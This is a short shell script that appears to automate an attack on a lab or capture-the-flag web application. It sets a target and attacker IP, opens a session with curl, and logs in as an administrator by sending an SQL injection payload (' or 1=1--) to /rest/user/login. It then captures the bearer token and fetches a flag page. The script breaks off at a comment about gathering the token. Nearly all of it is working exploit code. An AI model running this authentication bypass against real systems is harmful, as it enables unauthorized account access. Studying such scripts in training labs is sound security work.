#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.103"
attack_ip="10.10.190.240"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -c "/work/1-cookies.txt" -L > /dev/null
echo "--> Session initiated"

# Authenticate using SQL injection session
echo "2 - AUTHENTICATE THROUGH INJECTION"
curl -s -X POST "http://$target_ip/rest/user/login" -b "/work/1-cookies.txt" -c "/work/1-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or 1=1--'\",\"password\":\"a\"}" -o /work/1-admin.json
TOKEN=$(jq -r '.authentication.token' /work/1-admin.json)
echo "--> Authenticated with token ${TOKEN}"
curl -s -X GET "http://$target_ip/#" -b "/work/1-cookies.txt" -v -L -H "Authorization: Bearer ${TOKEN}" -o /work/1-flag.html

# Gather authentication token